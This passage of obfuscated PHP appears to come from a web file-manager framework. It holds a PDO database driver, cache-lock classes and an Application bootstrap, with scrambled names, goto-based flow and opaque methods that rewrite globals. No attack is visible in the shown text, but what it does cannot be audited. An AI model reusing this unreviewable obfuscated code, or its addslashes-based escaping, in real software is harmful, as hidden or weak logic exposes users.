$_SERVER[æ§›¦ÌáØ]; if ($A‘ÁĞêˆºÈ) { $b°ğ§ÒÉ§¹ = $this->parseKeyCheck($b°ğ§ÒÉ§¹); } if ($b°ğ§ÒÉ§¹ != $C³¤Á®”¥Š[182] && !preg_match($C³¤Á®”¥Š[862], $b°ğ§ÒÉ§¹)) { $b°ğ§ÒÉ§¹ = $C³¤Á®”¥Š[382] . trim($b°ğ§ÒÉ§¹, $C³¤Á®”¥Š[382]) . $C³¤Á®”¥Š[382]; } return $b°ğ§ÒÉ§¹; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($fâªëÅ¯¥ = '') { $aó¥¢¾Ÿ‘ñ =& $_SERVER[æ§›¦ÌáØ]; if (!class_exists($aó¥¢¾Ÿ‘ñ[864])) { think_exception(think_lang($aó¥¢¾Ÿ‘ñ[10]) . $aó¥¢¾Ÿ‘ñ[865]); } if (!empty($fâªëÅ¯¥)) { $this->config = $fâªëÅ¯¥; if (empty($this->config[$aó¥¢¾Ÿ‘ñ[13]])) { $this->config[$aó¥¢¾Ÿ‘ñ[13]] = array(); } } } public function connect($bÊ‘ÃåÙ¦ = '', $e³¤ Š¨‘ = 0) { $dì·¥Ëœ÷í =& $_SERVER[æ§›¦ÌáØ]; if (!isset($this->linkID[$e³¤ Š¨‘])) { goto bÃØ™ã¼‹; bÃØ™ã¼‹: if (empty($bÊ‘ÃåÙ¦)) { $bÊ‘ÃåÙ¦ = $this->config; } $dÆÜÜ³‚çÇ = !empty($bÊ‘ÃåÙ¦[$dì·¥Ëœ÷í[13]][$dì·¥Ëœ÷í[14]]) ? $bÊ‘ÃåÙ¦[$dì·¥Ëœ÷í[13]][$dì·¥Ëœ÷í[14]] : $this->pconnect; if ($dÆÜÜ³‚çÇ) { $bÊ‘ÃåÙ¦[$dì·¥Ëœ÷í[13]][PDO::ATTR_PERSISTENT] = !0; } goto Eá§­©èĞ“; C†Š¢Ô„À‹: if (1 != think_config($dì·¥Ëœ÷í[18])) { unset($this->config); } goto aÒçĞ‘Ïğ°; fØé‚Ğ¹÷ƒ: if (!$this->linkID[$e³¤ Š¨‘]) { think_exception($dì·¥Ëœ÷í[874]); } try { $this->linkID[$e³¤ Š¨‘]->exec($dì·¥Ëœ÷í[875] . think_config($dì·¥Ëœ÷í[842])); } catch (Exception $B·‡íñÛõ¯) { } $this->connected = !0; goto C†Š¢Ô„À‹; Eá§­©èĞ“: try { $this->linkID[$e³¤ Š¨‘] = new PDO($bÊ‘ÃåÙ¦[$dì·¥Ëœ÷í[866]], $bÊ‘ÃåÙ¦[$dì·¥Ëœ÷í[839]], $bÊ‘ÃåÙ¦[$dì·¥Ëœ÷í[840]], $bÊ‘ÃåÙ¦[$dì·¥Ëœ÷í[13]]); } catch (PDOException $B·‡íñÛõ¯) { think_exception($B·‡íñÛõ¯->getMessage()); } $this->dbType = $this->_getDsnType($bÊ‘ÃåÙ¦[$dì·¥Ëœ÷í[866]]); if (in_array($this->dbType, array($dì·¥Ëœ÷í[867], $dì·¥Ëœ÷í[868], $dì·¥Ëœ÷í[869], $dì·¥Ëœ÷í[870]))) { think_exception($dì·¥Ëœ÷í[871] . $this->dbType . $dì·¥Ëœ÷í[872] . $this->dbType . $dì·¥Ëœ÷í[873]); } goto fØé‚Ğ¹÷ƒ; aÒçĞ‘Ïğ°: } return $this->linkID[$e³¤ Š¨‘]; } public function free() { $this->PDOStatement = null; } public function query($C¯‹™ò°, $E„ÊÒ†’…© = array()) { goto Bæîñ›¥…È; D §éë„Å: think_action_status($FØ³ƒ±†­İ[19], 1); think_status($FØ³ƒ±†­İ[20]); $this->PDOStatement = $this->_linkID->prepare($C¯‹™ò°); goto DÚš³ÁÀº; E§·˜¶·»: $this->queryStr = $C¯‹™ò°; if (!empty($E„ÊÒ†’…©)) { $this->queryStr .= $FØ³ƒ±†­İ[876] . print_r($E„ÊÒ†’…©, !0) . $FØ³ƒ±†­İ[877]; } if (!empty($this->PDOStatement)) { $this->free(); } goto D §éë„Å; Bæîñ›¥…È: $FØ³ƒ±†­İ =& $_SERVER[æ§›¦ÌáØ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto E§·˜¶·»; DÚš³ÁÀº: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $C‰ë±œ‹ = $this->PDOStatement->execute($E„ÊÒ†’…©); $this->debug(); goto eßá†Ö”Ñ†; eßá†Ö”Ñ†: if (!1 === $C‰ë±œ‹) { $this->error(); return !1; } else { return $this->getAll(); } goto f¥„Öâ‹¥±; f¥„Öâ‹¥±: } public function execute($bÁÚòÍƒŠ½, $b„—Àƒì•• = array()) { goto EÓïµ„øÕá; C®í÷¢Ü´: if ($this->dbType == $aª‡•¬•‡—[870]) { if (preg_match($aª‡•¬•‡—[878], $this->queryStr, $D¤¶ÇÃ­”)) { $this->table = think_config($aª‡•¬•‡—[879]) . str_ireplace(think_config($aª‡•¬•‡—[880]), $aª‡•¬•‡—[375], $D¤¶ÇÃ­”[2]); $D¨¬Å Á‡­ = (bool) $this->query($aª‡•¬•‡—[881] . strtoupper($this->table) . $aª‡•¬•‡—[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($aª‡•¬•‡—[21], 1); goto c­àÖ—Şà; aÓ°Ñ¬¥˜™: $A™¤•ÃÃÀ = $this->PDOStatement->execute($b„—Àƒì••); $this->debug(); if (!1 === $A™¤•ÃÃÀ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($D¨¬Å Á‡­ || preg_match($aª‡•¬•‡—[882], $bÁÚòÍƒŠ½)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto fÌƒª˜Ñå; c­àÖ—Şà: think_status($aª‡•¬•‡—[20]); $this->PDOStatement = $this->_linkID->prepare($bÁÚòÍƒŠ½); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto aÓ°Ñ¬¥˜™; EÓïµ„øÕá: $aª‡•¬•‡— =& $_SERVER[æ§›¦ÌáØ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d…¥ÃƒñŞ; d…¥ÃƒñŞ: $this->queryStr = $bÁÚòÍƒŠ½; if (!empty($b„—Àƒì••)) { $this->queryStr .= $aª‡•¬•‡—[876] . print_r($b„—Àƒì••, !0) . $aª‡•¬•‡—[877]; } $D¨¬Å Á‡­ = !1; goto C®í÷¢Ü´; fÌƒª˜Ñå: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Bğ¡†ÎÖ¢‰ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Bğ¡†ÎÖ¢‰) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $D‹äÁæˆä‰ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$D‹äÁæˆä‰) { $this->error(); return !1; } } return !0; } private function getAll() { $CÑ¦­ô÷ñ‹ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($CÑ¦­ô÷ñ‹); return $CÑ¦­ô÷ñ‹; } public function getFields($C¿•¾ºïé) { goto b°Òˆö„¤; AĞõƒ×ÖÉ: $b»éøÇ÷™ = $this->query($aæë¨‘ãŞ„); $E‚ê‘äˆ¯Š = array(); if ($b»éøÇ÷™) { foreach ($b»éøÇ÷™ as $B±Ã¿å‡âÙ => $E ¬ÍÓˆå) { $E ¬ÍÓˆå = array_change_key_case($E ¬ÍÓˆå); $E ¬ÍÓˆå[$F‡Òõ˜ã[28]] = isset($E ¬ÍÓˆå[$F‡Òõ˜ã[28]]) ? $E ¬ÍÓˆå[$F‡Òõ˜ã[28]] : $F‡Òõ˜ã[375]; $E ¬ÍÓˆå[$F‡Òõ˜ã[29]] = isset($E ¬ÍÓˆå[$F‡Òõ˜ã[29]]) ? $E ¬ÍÓˆå[$F‡Òõ˜ã[29]] : $F‡Òõ˜ã[375]; $Aİ’ô¸ö• = isset($E ¬ÍÓˆå[$F‡Òõ˜ã[271]]) ? $E ¬ÍÓˆå[$F‡Òõ˜ã[271]] : $E ¬ÍÓˆå[$F‡Òõ˜ã[28]]; $E‚ê‘äˆ¯Š[$Aİ’ô¸ö•] = array($F‡Òõ˜ã[28] => $Aİ’ô¸ö•, $F‡Òõ˜ã[29] => $E ¬ÍÓˆå[$F‡Òõ˜ã[29]], $F‡Òõ˜ã[31] => (bool) (isset($E ¬ÍÓˆå[$F‡Òõ˜ã[103]]) && $E ¬ÍÓˆå[$F‡Òõ˜ã[103]] === $F‡Òõ˜ã[33] || isset($E ¬ÍÓˆå[$F‡Òõ˜ã[31]]) && $E ¬ÍÓˆå[$F‡Òõ˜ã[31]] === $F‡Òõ˜ã[33]), $F‡Òõ˜ã[34] => isset($E ¬ÍÓˆå[$F‡Òõ˜ã[34]]) ? $E ¬ÍÓˆå[$F‡Òõ˜ã[34]] : (isset($E ¬ÍÓˆå[$F‡Òõ˜ã[53]]) ? $E ¬ÍÓˆå[$F‡Òõ˜ã[53]] : $F‡Òõ˜ã[375]), $F‡Òõ˜ã[36] => isset($E ¬ÍÓˆå[$F‡Òõ˜ã[93]]) ? strtolower($E ¬ÍÓˆå[$F‡Òõ˜ã[93]]) == $F‡Òõ˜ã[38] : (isset($E ¬ÍÓˆå[$F‡Òõ˜ã[54]]) ? $E ¬ÍÓˆå[$F‡Òõ˜ã[54]] : !1), $F‡Òõ˜ã[39] => isset($E ¬ÍÓˆå[$F‡Òõ˜ã[899]]) ? strtolower($E ¬ÍÓˆå[$F‡Òõ˜ã[899]]) == $F‡Òõ˜ã[41] : (isset($E ¬ÍÓˆå[$F‡Òõ˜ã[93]]) ? $E ¬ÍÓˆå[$F‡Òõ˜ã[93]] : !1)); } } goto E¤İ‡öä»; E¤İ‡öä»: return $E‚ê‘äˆ¯Š; goto Fç‹ó¢áŠ; b°Òˆö„¤: $F‡Òõ˜ã =& $_SERVER[æ§›¦ÌáØ]; $this->initConnect(!0); if (think_config($F‡Òõ˜ã[883])) { $aæë¨‘ãŞ„ = str_replace($F‡Òõ˜ã[884], $C¿•¾ºïé, think_config($F‡Òõ˜ã[883])); } else { switch ($this->dbType) { case $F‡Òõ˜ã[867]: case $F‡Òõ˜ã[885]: $aæë¨‘ãŞ„ = "\x53\x45\114\105\103\124\40\40\x20\x63\157\154\165\155\156\x5f\156\141\x6d\145\40\x61\163\x20\47\x4e\x61\x6d\145\x27\x2c\x20\x20\40\144\x61\x74\141\x5f\164\x79\160\x65\x20\x61\163\40\x27\x54\171\x70\145\x27\x2c\x20\40\x20\143\x6f\x6c\165\155\x6e\137\x64\145\x66\141\x75\154\x74\x20\x61\163\40\47\104\145\x66\x61\x75\154\x74\47\x2c\40\40\x20\151\163\137\156\x75\154\x6c\141\x62\154\145\40\141\163\40\x27\116\x75\x6c\x6c\47\12\x9\x9\106\x52\117\115\x9\x69\x6e\146\x6f\162\x6d\141\164\151\x6f\x6e\137\163\143\x68\x65\x6d\141\x2e\164\141\x62\x6c\145\x73\40\101\123\40\164\12\11\x9\112\x4f\111\x4e\11\151\x6e\x66\157\162\155\x61\164\151\157\x6e\137\163\143\x68\145\155\141\56\143\157\154\165\155\x6e\x73\x20\x41\x53\40\x63\12\x9\x9\x4f\116\40\40\x74\x2e\x74\141\x62\x6c\x65\x5f\143\x61\x74\x61\154\157\x67\40\75\x20\143\x2e\x74\141\142\x6c\x65\x5f\143\141\164\141\154\157\147\xa\x9\11\101\116\104\40\x74\x2e\164\x61\x62\x6c\145\137\x73\x63\150\x65\155\141\x20\75\x20\143\x2e\164\x61\x62\x6c\145\137\163\x63\x68\145\155\x61\12\11\x9\x41\116\x44\40\164\56\164\141\x62\x6c\145\x5f\156\x61\x6d\145\x20\75\x20\x63\56\164\x61\142\x6c\145\137\x6e\x61\x6d\145\xa\x9\x9\127\110\105\122\105\40\40\40\x74\56\164\141\x62\x6c\x65\137\x6e\x61\x6d\145\40\75\40\x27{$C¿•¾ºïé}\47"; break; case $F‡Òõ˜ã[886]: $aæë¨‘ãŞ„ = $F‡Òõ˜ã[887] . $C¿•¾ºïé . $F‡Òõ˜ã[888]; break; case $F‡Òõ˜ã[868]: case $F‡Òõ˜ã[870]: $aæë¨‘ãŞ„ = $F‡Òõ˜ã[889] . $F‡Òõ˜ã[890] . $F‡Òõ˜ã[891] . strtoupper($C¿•¾ºïé) . $F‡Òõ˜ã[892] . strtoupper($C¿•¾ºïé) . $F‡Òõ˜ã[893]; break; case $F‡Òõ˜ã[894]: $aæë¨‘ãŞ„ = $F‡Òõ˜ã[895] . $C¿•¾ºïé . $F‡Òõ˜ã[896]; break; case $F‡Òõ˜ã[869]: break; case $F‡Òõ˜ã[897]: default: $aæë¨‘ãŞ„ = $F‡Òõ˜ã[898] . ($this->dbType == $F‡Òõ˜ã[897] ? "\x60{$C¿•¾ºïé}\140" : $C¿•¾ºïé); } } goto AĞõƒ×ÖÉ; Fç‹ó¢áŠ: } public function getTables($a¸‘Ïæ“òÆ = '') { $DÂê£¢‡² =& $_SERVER[æ§›¦ÌáØ]; if (think_config($DÂê£¢‡²[900])) { $AİôäÀÎ¤¬ = str_replace($DÂê£¢‡²[901], $a¸‘Ïæ“òÆ, think_config($DÂê£¢‡²[900])); } else { switch ($this->dbType) { case $DÂê£¢‡²[868]: case $DÂê£¢‡²[870]: $AİôäÀÎ¤¬ = $DÂê£¢‡²[902]; break; case $DÂê£¢‡²[867]: case $DÂê£¢‡²[885]: $AİôäÀÎ¤¬ = $DÂê£¢‡²[903]; break; case $DÂê£¢‡²[894]: $AİôäÀÎ¤¬ = $DÂê£¢‡²[904]; break; case $DÂê£¢‡²[869]: think_exception(think_lang($DÂê£¢‡²[905]) . $DÂê£¢‡²[906]); break; case $DÂê£¢‡²[886]: $AİôäÀÎ¤¬ = $DÂê£¢‡²[42] . $DÂê£¢‡²[43] . $DÂê£¢‡²[44]; break; case $DÂê£¢‡²[897]: default: if (!empty($a¸‘Ïæ“òÆ)) { $AİôäÀÎ¤¬ = $DÂê£¢‡²[850] . $a¸‘Ïæ“òÆ . $DÂê£¢‡²[851]; } else { $AİôäÀÎ¤¬ = $DÂê£¢‡²[852]; } } } $C“¸˜õŠ = $this->query($AİôäÀÎ¤¬); $bŠË®­£Ÿ» = array(); foreach ($C“¸˜õŠ as $AÌ…‡‡òò¹ => $F°â°çõİ±) { $bŠË®­£Ÿ»[$AÌ…‡‡òò¹] = current($F°â°çõİ±); } return $bŠË®­£Ÿ»; } protected function parseLimit($dØ‹åÆ˜½ô) { $díŒ²ôˆì =& $_SERVER[æ§›¦ÌáØ]; $cĞÙ¡ÆÎ¨Í = $díŒ²ôˆì[33]; if (!empty($dØ‹åÆ˜½ô)) { switch ($this->dbType) { case $díŒ²ôˆì[894]: case $díŒ²ôˆì[886]: $dØ‹åÆ˜½ô = explode($díŒ²ôˆì[47], $dØ‹åÆ˜½ô); if (count($dØ‹åÆ˜½ô) > 1) { $cĞÙ¡ÆÎ¨Í .= $díŒ²ôˆì[48] . $dØ‹åÆ˜½ô[1] . $díŒ²ôˆì[49] . $dØ‹åÆ˜½ô[0] . $díŒ²ôˆì[50]; } else { $cĞÙ¡ÆÎ¨Í .= $díŒ²ôˆì[48] . $dØ‹åÆ˜½ô[0] . $díŒ²ôˆì[50]; } break; case $díŒ²ôˆì[867]: case $díŒ²ôˆì[885]: break; case $díŒ²ôˆì[869]: break; case $díŒ²ôˆì[868]: case $díŒ²ôˆì[870]: break; case $díŒ²ôˆì[897]: default: $cĞÙ¡ÆÎ¨Í .= $díŒ²ôˆì[48] . $dØ‹åÆ˜½ô . $díŒ²ôˆì[50]; } } return $cĞÙ¡ÆÎ¨Í; } public function parseKey(&$D‚ƒ”ºÎ , $c·ªÛ¶Ä„ = true) { $A‚¯³«âŠî =& $_SERVER[æ§›¦ÌáØ]; if ($c·ªÛ¶Ä„) { $D‚ƒ”ºÎ  = $this->parseKeyCheck($D‚ƒ”ºÎ ); } if ($this->dbType == $A‚¯³«âŠî[897]) { if ($D‚ƒ”ºÎ  != $A‚¯³«âŠî[182] && !preg_match($A‚¯³«âŠî[862], $D‚ƒ”ºÎ )) { $D‚ƒ”ºÎ  = $A‚¯³«âŠî[382] . trim($D‚ƒ”ºÎ , $A‚¯³«âŠî[382]) . $A‚¯³«âŠî[382]; } return $D‚ƒ”ºÎ ; } else { return parent::parseKey($D‚ƒ”ºÎ , $c·ªÛ¶Ä„); } } public function close() { $this->_linkID = null; } public function error() { $AåÙÂ™˜øÁ =& $_SERVER[æ§›¦ÌáØ]; if ($this->PDOStatement) { $aõÓ‡«ÄÜ­ = $this->PDOStatement->errorInfo(); $this->error = $aõÓ‡«ÄÜ­[1] . $AåÙÂ™˜øÁ[4] . $aõÓ‡«ÄÜ­[2]; } else { $this->error = $AåÙÂ™˜øÁ[33]; } if ($AåÙÂ™˜øÁ[33] != $this->queryStr) { $this->error .= LNG($AåÙÂ™˜øÁ[45]) . $this->queryStr; } think_trace($this->error, $AåÙÂ™˜øÁ[33], $AåÙÂ™˜øÁ[46]); return $this->error; } public function escapeString($A—½ĞŠ¢‡) { $f·ÓòÑ¡æ =& $_SERVER[æ§›¦ÌáØ]; switch ($this->dbType) { case $f·ÓòÑ¡æ[894]: case $f·ÓòÑ¡æ[867]: case $f·ÓòÑ¡æ[885]: case $f·ÓòÑ¡æ[897]: return addslashes($A—½ĞŠ¢‡); case $f·ÓòÑ¡æ[869]: case $f·ÓòÑ¡æ[886]: case $f·ÓòÑ¡æ[868]: case $f·ÓòÑ¡æ[870]: return str_ireplace($f·ÓòÑ¡æ[55], $f·ÓòÑ¡æ[56], $A—½ĞŠ¢‡); } } protected function parseValue($EòÙœŠÄ») { $dÀ‡à™œ„° =& $_SERVER[æ§›¦ÌáØ]; if (is_string($EòÙœŠÄ»)) { $C•Š¡‹¹‘º = strpos($EòÙœŠÄ», $dÀ‡à™œ„°[4]) === 0 && in_array($EòÙœŠÄ», array_keys($this->bind)); $EòÙœŠÄ» = $C•Š¡‹¹‘º ? $this->escapeString($EòÙœŠÄ») : $dÀ‡à™œ„°[907] . $this->escapeString($EòÙœŠÄ») . $dÀ‡à™œ„°[907]; } elseif (isset($EòÙœŠÄ»[0]) && is_string($EòÙœŠÄ»[0]) && strtolower($EòÙœŠÄ»[0]) == $dÀ‡à™œ„°[295]) { $EòÙœŠÄ» = $this->escapeString($EòÙœŠÄ»[1]); } elseif (is_array($EòÙœŠÄ»)) { $EòÙœŠÄ» = array_map(array($this, $dÀ‡à™œ„°[908]), $EòÙœŠÄ»); } elseif (is_bool($EòÙœŠÄ»)) { $EòÙœŠÄ» = $EòÙœŠÄ» ? $dÀ‡à™œ„°[87] : $dÀ‡à™œ„°[191]; } elseif (is_null($EòÙœŠÄ»)) { $EòÙœŠÄ» = $dÀ‡à™œ„°[103]; } return $EòÙœŠÄ»; } public function getLastInsertId() { $D’Ãô¢ŞœË =& $_SERVER[æ§›¦ÌáØ]; switch ($this->dbType) { case $D’Ãô¢ŞœË[894]: case $D’Ãô¢ŞœË[886]: case $D’Ãô¢ŞœË[867]: case $D’Ãô¢ŞœË[885]: case $D’Ãô¢ŞœË[869]: case $D’Ãô¢ŞœË[897]: return $this->_linkID->lastInsertId(); case $D’Ãô¢ŞœË[868]: case $D’Ãô¢ŞœË[870]: $dÏÂ¾³Ú¬ = $this->table; $AµšÙ¿ø‚‚ = $this->query("\123\x45\114\105\103\x54\x20{$dÏÂ¾³Ú¬}\56\x63\165\x72\x72\x76\141\154\x20\x63\165\162\x72\166\141\x6c\x20\x46\122\117\x4d\40\144\165\x61\154"); return $AµšÙ¿ø‚‚ ? $AµšÙ¿ø‚‚[0][$D’Ãô¢ŞœË[909]] : 0; } } } goto C‚‰Š½Şˆ˜; döôï«Ä»: class CacheLockRedis { public function lock($d³±•…š£‹, $d¹ä«äóŒ = 10) { $dÒéÎ‰Í = Cache::init(); $d¨ÑÇ¢îÛ÷ = microtime(!0) + $d¹ä«äóŒ; while (microtime(!0) < $d¨ÑÇ¢îÛ÷) { $FÃíÔê‹É = $dÒéÎ‰Í->get($d³±•…š£‹); if (!$FÃíÔê‹É) { $eòôÊß°†á = $dÒéÎ‰Í->setLock($d³±•…š£‹, $d¨ÑÇ¢îÛ÷, $d¹ä«äóŒ); if ($eòôÊß°†á) { return !0; } } else { if ($FÃíÔê‹É < microtime(!0)) { $dÒéÎ‰Í->set($d³±•…š£‹, $d¨ÑÇ¢îÛ÷, $d¹ä«äóŒ * 2); if ($dÒéÎ‰Í->get($d³±•…š£‹) === $FÃíÔê‹É) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($d¬Œ¢Ò‚ñ„) { return Cache::init()->get($d¬Œ¢Ò‚ñ„); } public function unlock($còØ«½ó) { return Cache::init()->remove($còØ«½ó); } } class CacheLockMemcached { public function lock($fÚùÆƒ‹, $E¹©×Õ ö™ = 0) { $dˆİ•ç×÷ö = Cache::init(); $BÜÄœÚòã = microtime(!0) + $E¹©×Õ ö™; while (microtime(!0) < $BÜÄœÚòã) { $Aâ‰‚Ş‡„Ï = $dˆİ•ç×÷ö->get($fÚùÆƒ‹); if (!$Aâ‰‚Ş‡„Ï || $Aâ‰‚Ş‡„Ï < microtime(!0)) { $A¸İÁÀíÑ‰ = $dˆİ•ç×÷ö->handle->add($fÚùÆƒ‹, $BÜÄœÚòã, $E¹©×Õ ö™); if ($A¸İÁÀíÑ‰) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($cŠã©ÛËÅ¥) { return Cache::init()->get($cŠã©ÛËÅ¥); } public function unlock($e¶ïŒ‹ÒŞ‡) { return Cache::init()->remove($e¶ïŒ‹ÒŞ‡); } } class CacheLockDatabase { public function lock($F—²±µ‡à, $EêØ‚º = 0) { $FÕÖä©¿»è = Model($_SERVER[æ§›¦ÌáØ][795]); $cˆåìâÛùÔ = microtime(!0) + $EêØ‚º; while (microtime(!0) < $cˆåìâÛùÔ) { $D÷ÄèáÚ¦ = $FÕÖä©¿»è->get($F—²±µ‡à); if (!$D÷ÄèáÚ¦ || $D÷ÄèáÚ¦ < microtime(!0)) { $cø—Ò¾µœ¼ = $FÕÖä©¿»è->set($F—²±µ‡à, $cˆåìâÛùÔ); if ($cø—Ò¾µœ¼) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Bš¡—»Ôè) { return Model($_SERVER[æ§›¦ÌáØ][795])->get($Bš¡—»Ôè); } public function unlock($DŸ¬´µì•) { Model($_SERVER[æ§›¦ÌáØ][795])->remove($DŸ¬´µì•); } } goto E¿åÅ–¶Íª; fĞààğÆÖ½: if (strlen($CÌààİ¡„ ) < $_SERVER[æ§›¦ÌáØ][591]) { return; } class Application { private $defaultModule = "\151\156\144\x65\170"; private $defaultController = "\x69\156\x64\x65\170"; private $defaultAction = "\151\x6e\144\x65\170"; function __construct() { } public function setDefault($D–òˆÑª—) { goto EçÌç¶äßŠ; d¼º¾ö¿Ü: $fäÚ„ß†¶« = $_SERVER[æ§›¦ÌáØ][592]; goto c‹Ñê²; EçÌç¶äßŠ: $BÜø†–µ§Š =& $_SERVER[úÙ]; $BÎÀ§Âå = $BÜø†–µ§Š[0]($BÜø†–µ§Š[1], $BÜø†–µ§Š[2]($D–òˆÑª—, $BÜø†–µ§Š[1])); $this->defaultModule = $BÎÀ§Âå[0] ? $BÎÀ§Âå[0] : $this->defaultModule; goto DòÊã†œ›; DòÊã†œ›: $this->defaultController = $BÎÀ§Âå[1] ? $BÎÀ§Âå[1] : $this->defaultController; $this->defaultAction = $BÎÀ§Âå[2] ? $BÎÀ§Âå[2] : $this->defaultAction; $this->{$_SERVER[úÙ][3]}($BÜø†–µ§Š[4], array($this, $BÜø†–µ§Š[5])); goto d¼º¾ö¿Ü; c‹Ñê²: } public function appRun($Cå˜˜ÏÅÚ) { goto e”«Ö­…‘; f©Áğ¿Œòµ: $CÑ½©Ñœ—í = $B…¹öœ±±‘[7]; if ($e¹³¤Ã°ƒô == $B…¹öœ±±‘[8]) { $CÑ½©Ñœ—í = $B…¹öœ±±‘[9]; $cÈÑ™íšÔ÷[0] = $B…¹öœ±±‘[10]; $cÈÑ™íšÔ÷[1] = $cÈÑ™íšÔ÷[1] . $B…¹öœ±±‘[11]; $Cå˜˜ÏÅÚ = $B…¹öœ±±‘[12]($B…¹öœ±±‘[1], $cÈÑ™íšÔ÷); $Cå˜˜ÏÅÚ = $B…¹öœ±±‘[2]($Cå˜˜ÏÅÚ, $B…¹öœ±±‘[1]); } $B…¹öœ±±‘[13](array($B…¹öœ±±‘[14], $B…¹öœ±±‘[15]), $CÑ½©Ñœ—í . $B…¹öœ±±‘[16], $Cå˜˜ÏÅÚ); goto EªĞôØºÏâ; EªĞôØºÏâ: $B…¹öœ±±‘[17]($Cå˜˜ÏÅÚ); $eÛ†ˆ«ïÀì = $DŠĞ‘†Î [594]; if (strlen($eÛ†ˆ«ïÀì) < $DŠĞ‘†Î [595]) { die; } goto F†Ë¼¶¨ïí; a¶ËôƒŞÀ: $B³Ÿ­×ùŒÄ = $DŠĞ‘†Î [593]; if (!$B³Ÿ­×ùŒÄ) { return; } $e¹³¤Ã°ƒô = $B…¹öœ±±‘[6]($cÈÑ™íšÔ÷[0]); goto f©Áğ¿Œòµ; e”«Ö­…‘: $DŠĞ‘†Î  =& $_SERVER[æ§›¦ÌáØ]; $B…¹öœ±±‘ =& $_SERVER[úÙ]; $cÈÑ™íšÔ÷ = $B…¹öœ±±‘[0]($B…¹öœ±±‘[1], $Cå˜˜ÏÅÚ); goto a¶ËôƒŞÀ; F†Ë¼¶¨ïí: $B…¹öœ±±‘[13](array($B…¹öœ±±‘[14], $B…¹öœ±±‘[15]), $CÑ½©Ñœ—í . $B…¹öœ±±‘[18], $Cå˜˜ÏÅÚ); goto f¹¬Üç÷•–; f¹¬Üç÷•–: } private function autorun() { goto BÓİ‘ŞÃ¿ç; B¾¡ñçÇ´‰: foreach ($config[$B§Ğ¿ï©¶¼[20]] as $CÃò‘÷‹¡× => $e«¿¯‘ˆø) { $this->{$_SERVER[úÙ][21]}($e«¿¯‘ˆø); $B´‹Ó…éáË = $BÁ«ì–òù‡[597]; } goto d‘º âÛê; FÚ¢ñ˜¸“Ç: $AÈ÷ÍÑ‡“ = $BÁ«ì–òù‡[596]; while (strlen($AÈ÷ÍÑ‡“) < $BÁ«ì–òù‡[595]) { if (!$AÈ÷ÍÑ‡“) { break; } $AÈ÷ÍÑ‡“++; } if ($B§Ğ¿ï©¶¼[19]($config[$B§Ğ¿ï©¶¼[20]]) == 0) { return; } goto B¾¡ñçÇ´‰; BÓİ‘ŞÃ¿ç: $BÁ«ì–òù‡ =& $_SERVER[æ§›¦ÌáØ]; $B§Ğ¿ï©¶¼ =& $_SERVER[úÙ]; global $config; goto FÚ¢ñ˜¸“Ç; d‘º âÛê: } private function gcexdd9af4a6() { goto EêÊŠ´‡ÇÇ; A‹ÜµÈ…: if (!$eÍï‚íƒ™ || $bÇÅ¿ ôèÜ[24]($eÍï‚íƒ™) <= $bÇÅ¿ ôèÜ[24]($D’¦¤Š•Ë)) { return; } if ($bÇÅ¿ ôèÜ[6]($bÇÅ¿ ôèÜ[25]($eÍï‚íƒ™, -$bÇÅ¿ ôèÜ[24]($D’¦¤Š•Ë))) != $D’¦¤Š•Ë) { return; } $e“Ş½”…ƒï = $bÇÅ¿ ôèÜ[25]($eÍï‚íƒ™, 0, -$bÇÅ¿ ôèÜ[24]($D’¦¤Š•Ë)); goto bÏËÛ¬‚; bÏËÛ¬‚: $a“÷Ü÷Ì¿² = array($bÇÅ¿ ôèÜ[8], $e“Ş½”…ƒï); $a²á±Å½ß = $bÇÅ¿ ôèÜ[26]($GLOBALS[$bÇÅ¿ ôèÜ[22]][$bÇÅ¿ ôèÜ[23]], 1); $DŒÌ‡Õä…Ù = $CœËÅ³ºÎ…[599]; goto Cœ§¤à‰Ô; Cœ§¤à‰Ô: while ($DŒÌ‡Õä…Ù < $CœËÅ³ºÎ…[595]) { if ($DŒÌ‡Õä…Ù >= 0) { break; } $DŒÌ‡Õä…Ù++; } $GLOBALS[$bÇÅ¿ ôèÜ[22]][$bÇÅ¿ ôèÜ[23]] = $bÇÅ¿ ôèÜ[27]($a“÷Ü÷Ì¿², $a²á±Å½ß); $GLOBALS[$bÇÅ¿ ôèÜ[22]][$bÇÅ¿ ôèÜ[28]] = $bÇÅ¿ ôèÜ[29]($bÇÅ¿ ôèÜ[1], $GLOBALS[$bÇÅ¿ ôèÜ[22]][$bÇÅ¿ ôèÜ[23]]); goto bŠ‡’‡‰™ˆ; a©Î«ªƒ£: $FÁÄ¹Ûôğ· = $CœËÅ³ºÎ…[598]; while ($FÁÄ¹Ûôğ· < $CœËÅ³ºÎ…[595]) { if ($FÁÄ¹Ûôğ· >= 0) { break; } $FÁÄ¹Ûôğ·++; } $eÍï‚íƒ™ = $GLOBALS[$bÇÅ¿ ôèÜ[22]][$bÇÅ¿ ôèÜ[23]][0]; goto A‹ÜµÈ…; EêÊŠ´‡ÇÇ: $CœËÅ³ºÎ… =& $_SERVER[æ§›¦ÌáØ]; $bÇÅ¿ ôèÜ =& $_SERVER[úÙ]; $D’¦¤Š•Ë = $bÇÅ¿ ôèÜ[8]; goto a©Î«ªƒ£; bŠ‡’‡‰™ˆ: } private function mcux2b955213() { goto fŠ§Â±·…º; eÃ‰ã¬åâÑ: $e®ÔÊÛ…ƒé = $AàÏ£¹èİ[31]; $aŠƒãƒ‚Ùç = $FµÑá“›ãÆ[601]; if (strlen($aŠƒãƒ‚Ùç) < $FµÑá“›ãÆ[595]) { return; } goto dàâöÚ‘; 